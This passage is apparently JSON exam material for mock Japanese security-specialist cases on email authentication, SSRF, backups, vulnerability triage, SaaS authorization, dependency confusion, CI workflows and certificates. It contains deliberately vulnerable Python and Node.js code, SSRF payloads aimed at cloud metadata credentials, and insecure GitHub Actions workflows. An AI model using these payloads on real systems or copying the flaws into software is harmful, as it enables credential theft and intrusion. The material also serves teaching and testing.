+              "Q社経由のメールマガジン"
+            ],
+            [
+              "M3",
+              "192.0.2.50",
+              "campaign@news.r-shoken.example",
+              "campaign@r-shoken.example",
+              "news.r-shoken.example",
+              "pass",
+              "R社マーケティング部が契約した別の配信サービス経由"
+            ],
+            [
+              "M4",
+              "192.0.2.200",
+              "support@r-shoken.example",
+              "support@r-shoken.example",
+              "r-shoken.example",
+              "fail",
+              "顧客が利用するメーリングリストを経由して再配送。件名の先頭に“[ml-0042]”が付加されている"
+            ],
+            [
+              "M5",
+              "203.0.113.45",
+              "billing@r-shoken.example",
+              "billing@r-shoken.example",
+              "（署名なし）",
+              "—",
+              "R社の自社メールサーバから送信"
+            ],
+            [
+              "M6",
+              "198.51.100.140",
+              "info@r-shoken.example",
+              "info@r-shoken.example",
+              "mailsvc.example",
+              "pass",
+              "Q社が新設した送信サーバ経由"
+            ]
+          ],
+          "notes": [
+            "注記 受信サーバは，SPFの検証をエンベロープFromのドメインについて行い，DMARCの評価結果がfailとなったメールは，ポリシーに従って受信拒否する。DNSの問合せ失敗は発生していない。"
+          ]
+        }
+      ]
+    },
+    {
+      "caseId": "sc-b-mock01-c06",
+      "caseType": "single",
+      "title": "プロフィール画像取込み機能のサーバサイドリクエストフォージェリ",
+      "domains": [
+        "Webアプリケーションセキュリティ",
+        "クラウドセキュリティ",
+        "セキュアコーディング"
+      ],
+      "body": [
+        {
+          "type": "paragraph",
+          "text": "S社は，企業向けの人材管理SaaS（以下，Sサービスという）を提供している。Sサービスでは，新機能として，利用者が外部の画像配信サービスPCDN（ドメインpcdn.example。画像はimg.pcdn.example及びimg2.pcdn.exampleから配信される）上の画像のURLを指定すると，Sサービスのサーバがその画像を取得し，プロフィール画像として保存する機能（以下，画像取込み機能という）を開発した。保存した画像は，https://（Sサービスのホスト名）/avatars/<利用者ID> から，Content-Typeを判定せずにそのまま本人に配信する。画像取込み機能の実装を図1に，実行環境を表1に示す。"
+        },
+        {
+          "type": "code",
+          "id": "図1",
+          "caption": "画像取込み機能の実装（Python，抜粋）",
+          "language": "python",
+          "content": "import socket\nimport ipaddress\nfrom urllib.parse import urlparse\n\nimport requests\nfrom flask import abort\n\nMAX_SIZE = 2 * 1024 * 1024\n\ndef import_avatar(user_id: str, url: str) -> None:\n    p = urlparse(url)\n    if p.scheme not in (\"http\", \"https\"):\n        abort(400)\n    host = p.hostname or \"\"\n    if not host.endswith(\"pcdn.example\"):                 # (A) 取得元ホストの制限\n        abort(400)\n    addr = ipaddress.ip_address(socket.gethostbyname(host))\n    if addr.is_private or addr.is_loopback:               # (B) 内部宛て通信の防止\n        abort(400)\n    r = requests.get(url, timeout=5)                      # (C) 画像の取得\n    if len(r.content) > MAX_SIZE:\n        abort(413)\n    storage.put(f\"avatars/{user_id}\", r.content)          # (D) 保存",
+          "notes": [
+            "注記1 storage.putは，指定したキーでオブジェクトストレージにデータを保存する関数である。",
+            "注記2 requestsはバージョン2.32を使用しており，requests.getの引数は図1に示したもの以外は既定値である。"
+          ]
+        },
+        {
+          "type": "table",
+          "id": "表1",
+          "caption": "Sサービスの実行環境（抜粋）",
+          "columns": [
+            "項目",
+            "設定"
+          ],
+          "rows": [
+            [
+              "実行基盤",
+              "Amazon EC2（東京リージョン）。IAMロールapp-role（オブジェクトストレージ及びメッセージキューへのアクセス権限をもつ）をインスタンスプロファイルとして関連付けている"
+            ],
+            [
+              "インスタンスメタデータサービス（IMDS）",
+              "HttpEndpoint=enabled，HttpTokens=optional，HttpPutResponseHopLimit=1"
+            ],
+            [
+              "WAF",
+              "画像取込み機能へのリクエストのパラメタ中に，文字列“169.254.169.254”，“localhost”又は“127.0.0.1”が含まれる場合に遮断する"
+            ],
+            [
+              "名前解決",
+              "VPCのDNSリゾルバを使用する"
+            ]
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "リリース前の脆弱性診断において，診断員のTさん（登録セキスペ）は，画像取込み機能の url パラメタに表2の値を指定する試験を計画した。xpcdn.exampleは，試験用にTさんが取得したドメインであり，グローバルIPアドレスに名前解決される。xpcdn.example上のWebサーバは，任意のパスへのリクエストに対して“302 Found”と“Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role”を応答するように設定してある。なお，169.254.169.254を10進数の整数で表記すると2852039166となる。"
+        },
+        {
+          "type": "table",
+          "id": "表2",
+          "caption": "試験で指定するurlパラメタの値",
+          "columns": [
+            "記号",
+            "urlパラメタの値"
+          ],
+          "rows": [
+            [
+              "P1",
+              "http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role"
+            ],
+            [
+              "P2",
+              "https://img.pcdn.example@2852039166/latest/meta-data/iam/security-credentials/app-role"
+            ],
+            [
+              "P3",
+              "https://img.pcdn.example.evil-cdn.example/a.png"
+            ],
+            [
+              "P4",
+              "https://xpcdn.example/a.png"
+            ]
+          ]
+        }
+      ]
+    },
+    {
+      "caseId": "sc-b-mock01-c07",
+      "caseType": "single",
+      "title": "ランサムウェア被害からの復旧時点の判定",
+      "domains": [
+        "事業継続・バックアップ",
+        "インシデント対応"
+      ],
+      "body": [
+        {
+          "type": "paragraph",
+          "text": "T社は，従業員300名の食品卸売会社である。T社のファイルサーバのデータは，表1の方式でバックアップしている。バックアップソフトウェアは，ドメインアカウントsvc_bkを用いてNASの共有フォルダ \\\\nas01\\backup に書き込む。"
+        },
+        {
+          "type": "table",
+          "id": "表1",
+          "caption": "ファイルサーバのバックアップ方式",
+          "columns": [
+            "種別",
+            "取得タイミング",
+            "保存先",
+            "保持"
+          ],
+          "rows": [
+            [
+              "週次フルバックアップ",
+              "毎週日曜日01:00に開始し，同日04:00までに完了する",
+              "NASの共有フォルダ",
+              "2世代。新しいフルバックアップの完了時点で，最も古い世代（フルバックアップ及びそれを基点とする増分バックアップ）を削除する"
+            ],
+            [
+              "日次増分バックアップ",
+              "毎日22:00（日曜日を含む）。直前のバックアップ以降に変更されたファイルを取得する",
+              "NASの共有フォルダ",
+              "基点となるフルバックアップと同時に削除する"
+            ],
+            [
+              "NASスナップショット",
+              "毎日23:30に，共有フォルダ全体の読取り専用スナップショットを作成する",
+              "NAS内部",
+              "7世代。8世代目の作成時に最も古いものを削除する"
+            ],
+            [
+              "月次複製",
+              "毎月第1日曜日の06:00に，同日のフルバックアップだけをクラウドのオブジェクトストレージに複製する",
+              "オブジェクトストレージ（オブジェクトロック：コンプライアンスモード）",
+              "90日"
+            ]
+          ],
+          "notes": [
+            "注記1 NASスナップショットの作成・削除・復元は，NASの管理画面からだけ実行できる。管理画面には，ドメインとは独立したNAS固有の管理者アカウントで，多要素認証を用いてログインする。",
+            "注記2 増分バックアップからの復元には，基点となるフルバックアップと，それ以降の全ての増分バックアップが必要である。"
+          ]
+        },
+        {
+          "type": "heading",
+          "text": "〔インシデントの発生〕"
+        },
+        {
+          "type": "paragraph",
+          "text": "2026年11月18日（水），ファイルサーバとNASの共有フォルダ上のファイルが暗号化されていることが発見された。T社の情報システム課のSさん（登録セキスペ）が外部の専門事業者と調査した結果，表2のことが判明した。"
+        },
+        {
+          "type": "table",
+          "id": "表2",
+          "caption": "調査結果（抜粋）",
+          "columns": [
+            "日時",
+            "事象"
+          ],
+          "rows": [
+            [
+              "11月2日（月）10:15",
+              "経理部のPCで攻撃者のメールの添付ファイルが開かれ，PCが侵害された"
+            ],
+            [
+              "11月5日（木）14:20",
+              "攻撃者が，ファイルサーバ上の共有フォルダ“取引先マスタ”内のExcelファイル37件に不正なマクロを埋め込んだ。以降，11月16日まで，複数のフォルダで同様の改ざんが続いた"
+            ],
+            [
+              "11月12日（木）",
+              "攻撃者がsvc_bkの認証情報を窃取した"
+            ],
+            [
+              "11月18日（水）03:10",
+              "ファイルサーバ及びNASの共有フォルダ上のファイルの暗号化が開始された"
+            ],
+            [
+              "11月18日（水）08:30",
+              "暗号化が発見され，ファイルサーバとNASをネットワークから隔離した"
+            ]
+          ],
+          "notes": [
+            "注記1 NASの管理画面へのログインは，10月以降，T社の担当者によるもの以外に記録されていない。NASスナップショットは全て改変されていないことを確認した。",
+            "注記2 オブジェクトストレージ上の複製は，改変されていないことを確認した。"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "T社は，改ざんされたファイルを一切含まない時点のデータでファイルサーバ全体を復元し，その後の差分は業務部門が手作業で再入力する方針とした。ファイル単位で改ざんの有無を選別して復元する方法は採らない。"
+        }
+      ]
+    },
+    {
+      "caseId": "sc-b-mock01-c08",
+      "caseType": "single",
+      "title": "脆弱性対応基準に基づく対応区分の判定",
+      "domains": [
+        "脆弱性管理",
+        "セキュリティマネジメント"
+      ],
+      "body": [
+        {
+          "type": "paragraph",
+          "text": "U社は，従業員2,500名の建設会社である。U社では，製品の脆弱性情報を入手した際に，表1の脆弱性対応基準（以下，対応基準という）に従って対応区分を判定し，期限内に修正プログラムを適用している。"
+        },
+        {
+          "type": "box",
+          "id": "表1",
+          "caption": "U社の脆弱性対応基準（抜粋）",
+          "blocks": [
+            {
+              "type": "list",
+              "style": "numbered",
+              "items": [
+                "対応区分と修正プログラムの適用期限は，緊急：判定から72時間以内，高：14日以内，中：30日以内，低：次回の定期保守時とする。",
+                "対応区分は，次の(1)〜(3)の順に判定する。"
+              ]
+            },
+            {
+              "type": "list",
+              "style": "bullet",
+              "items": [
+                "(1) 次のa又はbのいずれかに該当する脆弱性は“緊急”とする。\n a　KEVカタログ（米国CISAが公開している，悪用が確認された脆弱性のカタログ）に掲載されており，かつ，当該脆弱性の攻撃経路となるインタフェースがインターネットから到達可能である。\n b　認証不要で任意のコードを実行できる脆弱性であって，攻撃コードが公開されており，かつ，当該脆弱性の攻撃経路となるインタフェースがインターネットから到達可能である。",
+                "(2) (1)に該当しない脆弱性は，CVSS v3.1の基本値によって，7.0以上を“高”，4.0以上7.0未満を“中”，4.0未満を“低”とする。",
+                "(3) (2)で区分を判定した脆弱性について，有効な緩和策が適用されている場合は，区分を一つ下げる（“低”はそのままとする）。(1)で“緊急”とした脆弱性には適用しない。"
+              ]
+            },
+            {
+              "type": "list",
+              "style": "bullet",
+              "items": [
+                "用語の定義",
+                "・インターネットから到達可能：ファイアウォール，装置のアクセス制御リスト（ACL）などの既存のアクセス制御を考慮した上で，インターネット上の任意の送信元からの通信が当該インタフェースに到達し得ること。",
+                "・有効な緩和策：ベンダーが公表した回避策の適用，又はIPS若しくはWAFによる当該脆弱性への攻撃通信の遮断であって，情報セキュリティ部が有効性を確認したもの。検知だけを行う設定は含まない。既存のアクセス制御は到達可能性の判定にだけ用い，緩和策としては扱わない。"
+              ]
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "11月のある日，U社の情報セキュリティ部のRさん（登録セキスペ）は，表2の脆弱性情報を入手した。"
+        },
+        {
+          "type": "table",
+          "id": "表2",
+          "caption": "入手した脆弱性情報と当該資産の状況",
+          "columns": [
+            "項番",
+            "対象資産",
+            "脆弱性の概要",
+            "CVSS v3.1基本値（ベクトル）",
+            "KEVカタログ",
+            "攻撃コード",
+            "資産の状況"
+          ],
+          "rows": [
+            [
+              "1",
+              "SSL-VPN装置VPN-01",
+              "管理画面（TCP/8443）における認証回避及び任意のコード実行",
+              "9.8（AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H）",
+              "掲載",
+              "公開",
+              "VPNポータル（TCP/443）はインターネットに公開している。管理画面（TCP/8443）は，装置のACLによって管理セグメント10.20.5.0/24からだけ接続できる。ベンダーの回避策は公表されていない"
+            ],
+            [
+              "2",
+              "社内WikiサーバWIKI-01",
+              "認証済み利用者によるサーバサイドテンプレートインジェクション（任意のコード実行）",
+              "8.8（AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H）",
+              "未掲載",
+              "公開",
+              "社内LANからだけ利用できる。当該攻撃を遮断するシグネチャをWAFに追加し，情報セキュリティ部が試験したところ，攻撃通信は全て“検知”としてログに記録された。WAFは導入後の誤検知調査のため，全シグネチャを検知モード（ログ記録だけを行う）で運用している"
+            ],
+            [
+              "3",
+              "メール中継サーバMTA-01",
+              "添付ファイル解析処理における，認証不要の任意のコード実行",
+              "9.0（AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H）",
+              "未掲載",
+              "公開",
+              "インターネットからSMTP（TCP/25）でメールを受信している。当該脆弱性への攻撃通信を遮断するシグネチャをIPS（遮断モードで運用）に適用し，情報セキュリティ部が有効性を確認した"
+            ]
+          ]
+        }
+      ]
+    },
+    {
+      "caseId": "sc-b-mock01-c09",
+      "caseType": "multi",
+      "problemNo": 9,
+      "title": "マルチテナント型勤怠管理SaaSの認可設計",
+      "domains": [
+        "Webアプリケーションセキュリティ",
+        "認可設計"
+      ],
+      "body": [
+        {
+          "type": "paragraph",
+          "text": "V社は，企業向けの勤怠管理SaaS（以下，Kサービスという）を提供している。Kサービスはマルチテナント構成であり，契約企業ごとにテナントIDを割り当て，全テナントのデータを一つのデータベースに格納している。V社は，Kサービスの次期リリースに先立ち，情報セキュリティ部のQさん（登録セキスペ）にWeb APIのレビューを依頼した。"
+        },
+        {
+          "type": "heading",
+          "text": "〔認証とトークン〕"
+        },
+        {
+          "type": "paragraph",
+          "text": "利用者がKサービスの認証サーバでログインすると，認証サーバは，アクセストークン（JWT，RS256署名）とリフレッシュトークンを発行する。アクセストークンとリフレッシュトークンの仕様を表1に示す。Web APIは，アクセストークンを検証し，そのクレームの値を基に認可を行う。"
+        },
+        {
+          "type": "table",
+          "id": "表1",
+          "caption": "トークンの仕様（抜粋）",
+          "columns": [
+            "項目",
+            "内容"
+          ],
+          "rows": [
+            [
+              "アクセストークンのクレーム",
+              "iss（発行者），aud（kintai-api），sub（利用者ID），tid（テナントID），role（member，manager又はadmin），exp（有効期限）"
+            ],
+            [
+              "アクセストークンの有効期間",
+              "15分"
+            ],
+            [
+              "リフレッシュトークンの有効期間",
+              "8時間"
+            ],
+            [
+              "アクセストークンの更新",
+              "クライアントがリフレッシュトークンを提示すると，認証サーバは，usersテーブルを利用者IDで検索し，その時点のtenantIdとroleをtid・roleクレームに設定した新しいアクセストークンを発行する"
+            ],
+            [
+              "ログイン時の発行",
+              "usersテーブルのその時点のtenantIdとroleをクレームに設定する"
+            ]
+          ]
+        },
+        {
+          "type": "heading",
+          "text": "〔データと認可仕様〕"
+        },
+        {
+          "type": "table",
+          "id": "表2",
+          "caption": "usersテーブルの列（抜粋）",
+          "columns": [
+            "列名",
+            "内容"
+          ],
+          "rows": [
+            [
+              "id",
+              "利用者ID（例：u-101）"
+            ],
+            [
+              "tenantId",
+              "所属テナントのID"
+            ],
+            [
+              "email",
+              "ログインID（全テナントで一意）"
+            ],
+            [
+              "passwordHash",
+              "パスワードのハッシュ値"
+            ],
+            [
+              "displayName",
+              "表示名"
+            ],
+            [
+              "phone",
+              "電話番号"
+            ],
+            [
+              "locale",
+              "表示言語"
+            ],
+            [
+              "role",
+              "利用者の役割（member，manager又はadmin）"
+            ],
+            [
+              "teamId",
+              "所属するチームのID"
+            ],
+            [
+              "managedTeamIds",
+              "managerが管理するチームのIDの配列"
+            ]
+          ],
+          "notes": [
+            "注記 toPublic関数は，passwordHashを除いた全ての列の値を返す。(5)の利用者名簿は，全てのroleの利用者が自テナントの同僚の連絡先を確認するための機能である。"
+          ]
+        },
+        {
+          "type": "table",
+          "id": "表3",
+          "caption": "勤怠記録の参照に関する認可仕様",
+          "columns": [
+            "role",
+            "参照できる勤怠記録"
+          ],
+          "rows": [
+            [
+              "member",
+              "自身の勤怠記録だけ"
+            ],
+            [
+              "manager",
+              "自身の勤怠記録，及び自テナント内で自身が管理するチーム（managedTeamIds）に所属する利用者の勤怠記録"
+            ],
+            [
+              "admin",
+              "自テナント内の全ての勤怠記録"
+            ]
+          ],
+          "notes": [
+            "注記 他テナントの勤怠記録に対する要求には，存在の有無を推測されないよう，存在しない場合と同じ404を返す。"
+          ]
+        },
+        {
+          "type": "code",
+          "id": "図1",
+          "caption": "Web APIの実装（Node.js，抜粋）",
+          "language": "javascript",
+          "content": "const jwt = require(\"jsonwebtoken\");\n\nfunction authenticate(req, res, next) {\n  const token = (req.headers.authorization || \"\").replace(/^Bearer /, \"\");\n  try {\n    const c = jwt.verify(token, PUBLIC_KEY, {\n      algorithms: [\"RS256\"],\n      issuer: \"https://auth.kintai.example\",\n      audience: \"kintai-api\",\n    });\n    req.user = { id: c.sub, tenantId: c.tid, role: c.role };\n    next();\n  } catch (e) {\n    return res.status(401).end();\n  }\n}\n\nfunction requireRole(...roles) {\n  return (req, res, next) =>\n    roles.includes(req.user.role) ? next() : res.status(403).end();\n}\n\n// (1) 勤怠記録の参照\napp.get(\"/api/v1/timesheets/:id\", authenticate, async (req, res) => {\n  const ts = await db.timesheets.findById(req.params.id);\n  if (!ts) return res.status(404).end();\n  if (req.user.role === \"member\" && ts.userId !== req.user.id) {\n    return res.status(403).end();\n  }\n  res.json(ts);\n});\n\n// (2) 勤怠記録の承認\napp.post(\"/api/v1/timesheets/:id/approve\", authenticate,\n  requireRole(\"manager\", \"admin\"), async (req, res) => {\n  const ts = await db.timesheets.findOne({ id: req.params.id, tenantId: req.user.tenantId });\n  if (!ts) return res.status(404).end();\n  ts.status = \"approved\";\n  ts.approvedBy = req.user.id;\n  await db.timesheets.save(ts);\n  res.json(ts);\n});\n\n// (3) チームの所属者一覧\napp.get(\"/api/v1/teams/:teamId/members\", authenticate,\n  requireRole(\"manager\", \"admin\"), async (req, res) => {\n  const team = await db.teams.findOne({ id: req.params.teamId, tenantId: req.user.tenantId });\n  if (!team) return res.status(404).end();\n  res.json(await db.users.find({ teamId: team.id, tenantId: req.user.tenantId }));\n});\n\n// (4) 自身の利用者情報の更新\napp.patch(\"/api/v1/users/me\", authenticate, async (req, res) => {\n  const u = await db.users.findOne({ id: req.user.id, tenantId: req.user.tenantId });\n  Object.assign(u, req.body);\n  await db.users.save(u);\n  res.json(toPublic(u));\n});\n\n// (5) 自テナントの利用者名簿\napp.get(\"/api/v1/users\", authenticate, async (req, res) => {\n  const list = await db.users.find({ tenantId: req.user.tenantId });\n  res.json(list.map(toPublic));\n});",
+          "notes": [
+            "注記1 db.timesheets.findByIdは，勤怠記録IDだけで検索する。findOne・findは，指定した全ての条件に一致するものを検索する。",
+            "注記2 勤怠記録IDは，全テナント共通の連番（ts-1，ts-2，…）である。",
+            "注記3 Expressの通常の動作のとおり，requireRoleで403を返した場合は，後続の処理は実行されない。"
+          ]
+        },
+        {
+          "type": "table",
+          "id": "表4",
+          "caption": "レビュー用の検証データ",
+          "columns": [
+            "種別",
+            "ID",
+            "テナント",
+            "属性"
+          ],
+          "rows": [
+            [
+              "利用者",
+              "u-101",
+              "T-A",
+              "member，teamId=team-A1"
+            ],
+            [
+              "利用者",
+              "u-102",
+              "T-A",
+              "manager，managedTeamIds=[team-A1]"
+            ],
+            [
+              "利用者",
+              "u-103",
+              "T-A",
+              "member，teamId=team-A2"
+            ],
+            [
+              "利用者",
+              "u-201",
+              "T-B",
+              "member，teamId=team-B1"
+            ],
+            [
+              "利用者",
+              "u-202",
+              "T-B",
+              "manager，managedTeamIds=[team-B1]"
+            ],
+            [
+              "利用者",
+              "u-209",
+              "T-B",
+              "admin"
+            ],
+            [
+              "勤怠記録",
+              "ts-5001",
+              "T-A",
+              "u-101の記録（teamId=team-A1）"
+            ],
+            [
+              "勤怠記録",
+              "ts-5002",
+              "T-A",
+              "u-103の記録（teamId=team-A2）"
+            ],
+            [
+              "勤怠記録",
+              "ts-7001",
+              "T-B",
+              "u-201の記録（teamId=team-B1）"
+            ],
+            [
+              "チーム",
+              "team-A1",
+              "T-A",
+              "所属者：u-101"
+            ]
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Qさんは，検証データを用いて，表5の要求を送信する試験を計画した。いずれの要求も，送信者本人がログインして取得した有効なアクセストークンを付与し，その後にusersテーブルは変更されていないものとする。"
+        },
+        {
+          "type": "table",
+          "id": "表5",
+          "caption": "試験で送信する要求",
+          "columns": [
+            "記号",
+            "送信者",
+            "要求"
+          ],
+          "rows": [
+            [
+              "R1",
+              "u-201",
+              "GET /api/v1/timesheets/ts-7001"
+            ],
+            [
+              "R2",
+              "u-201",
+              "GET /api/v1/timesheets/ts-5001"
+            ],
+            [
+              "R3",
+              "u-202",
+              "GET /api/v1/timesheets/ts-5001"
+            ],
+            [
+              "R4",
+              "u-202",
+              "POST /api/v1/timesheets/ts-5001/approve"
+            ],
+            [
+              "R5",
+              "u-209",
+              "GET /api/v1/timesheets/ts-5002"
+            ],
+            [
+              "R6",
+              "u-202",
+              "GET /api/v1/teams/team-A1/members"
+            ],
+            [
+              "R7",
+              "u-102",
+              "GET /api/v1/timesheets/ts-5002"
+            ]
+          ]
+        }
+      ]
+    },
+    {
+      "caseId": "sc-b-mock01-c10",
+      "caseType": "multi",
+      "problemNo": 10,
+      "title": "Pythonサービスのビルドパイプラインにおけるサプライチェーンリスク",
+      "domains": [
+        "ソフトウェアサプライチェーン",
+        "CI/CD",
+        "インシデント対応"
+      ],
+      "body": [
+        {
+          "type": "paragraph",
+          "text": "W社は，ECサイトを運営する従業員600名の会社である。W社のサービスはPython 3.12で開発された五つのAPI（以下，サービスという）から成り，各サービスのコンテナイメージは，ビルドのたびにpipで依存パッケージを取得して作成している。"
+        },
+        {
+          "type": "paragraph",
+          "text": "W社は，社内共通の認証ライブラリwco-auth-utilsを開発しており，社内専用のパッケージインデックス（以下，社内インデックスという）で配布している。W社の社内パッケージは，全てwco-で始まる名称である。社内インデックス及び関連するリポジトリを表1に示す。"
+        },
+        {
+          "type": "table",
+          "id": "表1",
+          "caption": "パッケージの取得先",
+          "columns": [
+            "名称",
+            "URL",
+            "内容"
+          ],
+          "rows": [
+            [
+              "社内インデックス",
+              "https://pypi.internal.example/simple",
+              "W社の社内パッケージだけを配布する。wco-auth-utilsは2.4.0と2.4.1を登録している。配送APIが利用する公開パッケージは，セキュリティ部の確認後に社内インデックスにも登録している"
+            ],
+            [
+              "統合リポジトリ",
+              "https://repo.internal.example/pypi-all/simple",
+              "リポジトリ製品の仮想リポジトリ機能で，社内インデックスと公開PyPIのキャッシュを統合したもの。同名のパッケージは両方のバージョンを合わせて返す。除外ルールは設定していない"
+            ],
+            [
+              "公開PyPI",
+              "https://pypi.org/simple",
+              "pipの既定のインデックス"
+            ]
+          ]
+        },
+        {
+          "type": "heading",
+          "text": "〔インシデントの発生〕"
+        },
+        {
+          "type": "paragraph",
+          "text": "11月3日09:00，公開PyPIに第三者がwco-auth-utils 9.0.0（ソース配布物だけ）を登録した。このパッケージは，インストール時に実行される処理の中で，環境変数をインターネット上のサーバへ送信するものであった。W社は11月5日にこの事実を把握し，情報セキュリティ部のPさん（登録セキスペ）が影響調査を開始した。各サービスのビルド設定を表2に示す。各サービスは，11月3日09:00以降に少なくとも1回ビルドされており，その間に表2の設定は変更されていない。"
+        },
+        {
+          "type": "table",
+          "id": "表2",
+          "caption": "各サービスのビルド設定",
+          "columns": [
+            "サービス",
+            "pipのコマンド",
+            "requirements.txt中のwco-auth-utilsの指定"
+          ],
+          "rows": [
+            [
+              "S1 受注API",
+              "pip install -r requirements.txt --extra-index-url https://pypi.internal.example/simple",
+              "wco-auth-utils>=2.4"
+            ],
+            [
+              "S2 在庫API",
+              "pip install -r requirements.txt --extra-index-url https://pypi.internal.example/simple",
+              "wco-auth-utils~=2.4"
+            ],
+            [
+              "S3 配送API",
+              "pip install -r requirements.txt --index-url https://pypi.internal.example/simple",
+              "wco-auth-utils>=2.4"
+            ],
+            [
+              "S4 会員API",
+              "pip install -r requirements.txt --index-url https://repo.internal.example/pypi-all/simple",
+              "wco-auth-utils>=2.4"
+            ],
+            [
+              "S5 決済API",
+              "pip install --require-hashes -r requirements.txt --extra-index-url https://pypi.internal.example/simple",
+              "wco-auth-utils==2.4.1 --hash=sha256:9c1e…（社内インデックスの2.4.1のwheelのハッシュ値）"
+            ]
+          ],
+          "notes": [
+            "注記1 pipのバージョンは24.3で，表2に示した以外のオプション及び設定ファイル・環境変数による設定はない。",
+            "注記2 wco-auth-utilsの全バージョンは，Python 3.12で利用可能である。キャッシュは使用しない。"
+          ]
+        },
+        {
+          "type": "heading",
+          "text": "〔CIの設定〕"
+        },
+        {
+          "type": "paragraph",
+          "text": "W社は，社外の開発者からの貢献を受け付けるため，一部のツールを公開リポジトリとしてGitHubで管理している。Pさんは，同種のサプライチェーン攻撃の入口となり得るCIの設定についても調査した。公開リポジトリwco-sdkには，図2〜図5のワークフローが設定されている。"
+        },
+        {
+          "type": "code",
+          "id": "図2",
+          "caption": "WF1 .github/workflows/ci.yml",
+          "language": "yaml",
+          "content": "name: ci\non:\n  pull_request:\n    branches: [main]\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    env:\n      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}\n    steps:\n      - uses: actions/checkout@v4\n      - run: pip install -r requirements.txt && pytest"
+        },
+        {
+          "type": "code",
+          "id": "図3",
+          "caption": "WF2 .github/workflows/pr-title-check.yml",
+          "language": "yaml",
+          "content": "name: pr-title-check\non:\n  pull_request_target:\n    types: [opened, edited, synchronize]\njobs:\n  check:\n    runs-on: ubuntu-latest\n    env:\n      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}\n    steps:\n      - uses: actions/checkout@v4\n      - name: Check title\n        run: |\n          TITLE=\"${{ github.event.pull_request.title }}\"\n          ./scripts/check_title.sh \"$TITLE\""
+        },
+        {
+          "type": "code",
+          "id": "図4",
+          "caption": "WF3 .github/workflows/integration.yml",
+          "language": "yaml",
+          "content": "name: integration\non:\n  pull_request_target:\n    types: [opened, synchronize]\njobs:\n  integration:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n          allow-unsafe-pr-checkout: true\n      - name: Integration test\n        env:\n          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}\n        run: pip install -r requirements.txt && pytest tests/integration"
+        },
+        {
+          "type": "code",
+          "id": "図5",
+          "caption": "WF4 .github/workflows/release.yml",
+          "language": "yaml",
+          "content": "name: release\non:\n  push:\n    tags: [\"v*\"]\njobs:\n  release:\n    runs-on: ubuntu-latest\n    env:\n      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}\n    steps:\n      - uses: actions/checkout@v4\n      - run: ./scripts/build_and_publish.sh"
+        },
+        {
+          "type": "paragraph",
+          "text": "wco-sdkでは，GitHub Actionsのイベントポリシーでpull_request_targetイベントを明示的に許可している。それ以外のGitHub Actionsの設定は既定値のままであり，リポジトリシークレットDEPLOY_TOKEN（社内インデックスへのパッケージ登録権限をもつ）を登録している。scripts/check_title.shは，引数の文字列が命名規則に合うかどうかを検査するだけのスクリプトである。攻撃者は，フォークしたリポジトリからプルリクエストを作成でき，過去にプルリクエストがマージされた実績がある（初回の貢献者ではない）ものとする。"
+        },
+        {
+          "type": "heading",
+          "text": "〔再発防止策の検討〕"
+        },
+        {
+          "type": "paragraph",
+          "text": "情報システム部は，次の条件の下で，全サービスに適用する再発防止策を検討することにした。"
+        },
+        {
+          "type": "list",
+          "style": "bullet",
+          "items": [
+            "今後も社内パッケージは増えるが，名称は全てwco-で始める。",
+            "各サービスのrequirements.txtでは，運用上の理由から，バージョンの範囲指定（>=など）が今後も残る。",
+            "各サービスは，社内パッケージに加え，公開PyPIのパッケージも引き続き利用する。"
+          ]
+        }
+      ]
+    },
+    {
+      "caseId": "sc-b-mock01-c11",
+      "caseType": "multi",
+      "problemNo": 11,
+      "title": "ECサイトの証明書管理・TLS設定・パスワード保管の点検",
+      "domains": [
+        "暗号・証明書",
+        "PKI",
+        "パスワード保護"
+      ],
+      "body": [
+        {
+          "type": "paragraph",
+          "text": "X社は，会員制のECサイトを運営している。X社は，主ドメインx-shop.exampleを使用し，決済機能（pay.x-shop.example）は子会社が運用している。X社の情報セキュリティ部のNさん（登録セキスペ）は，証明書の不正発行の監視，TLS設定の点検，会員パスワードの保管方式の点検を行った。"
+        },
+        {
+          "type": "heading",
+          "text": "〔証明書の不正発行の監視〕"
+        },
+        {
+          "type": "paragraph",
+          "text": "X社は，DNSのCAAレコードで証明書を発行できる認証局（CA）を制限している。CAAレコードの変更履歴を表1に示す。表1に記載していないドメイン名には，CAAレコードを設定していない。CA-αの識別子はca-alpha.example，CA-βの識別子はca-beta.exampleである。"
+        },
+        {
+          "type": "table",
+          "id": "表1",
+          "caption": "CAAレコードの変更履歴",
+          "columns": [
+            "期間",
+            "x-shop.exampleのCAAレコード",
+            "pay.x-shop.exampleのCAAレコード"
+          ],
+          "rows": [
+            [
+              "2026年9月30日まで",
+              "0 issue \"ca-alpha.example\"\n0 issue \"ca-beta.example\"\n0 issuewild \";\"",
+              "0 issue \"ca-beta.example\""
+            ],
+            [
+              "2026年10月1日から",
+              "0 issue \"ca-alpha.example\"\n0 issuewild \";\"",
+              "0 issue \"ca-beta.example\""
+            ]
+          ],
+          "notes": [
+            "注記 CAAレコードの変更は，変更日の00:00に全てのDNSサーバに反映された。各CAは，発行の直前にCAAレコードを確認するものとする。"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Nさんは，Certificate Transparency（CT）ログを監視するサービスを利用し，x-shop.example配下のドメイン名を含む証明書を表2のとおり抽出した。"
+        },
+        {
+          "type": "table",
+          "id": "表2",
+          "caption": "CTログから抽出した証明書（抜粋）",
+          "columns": [
+            "記号",
+            "発行したCA",
+            "subjectAltNameのDNS名",
+            "発行日時"
+          ],
+          "rows": [
+            [
+              "C1",
+              "CA-α",
+              "x-shop.example，www.x-shop.example",
+              "2026-09-15 10:02"
+            ],
+            [
+              "C2",
+              "CA-β",
+              "api.x-shop.example",
+              "2026-10-12 14:30"
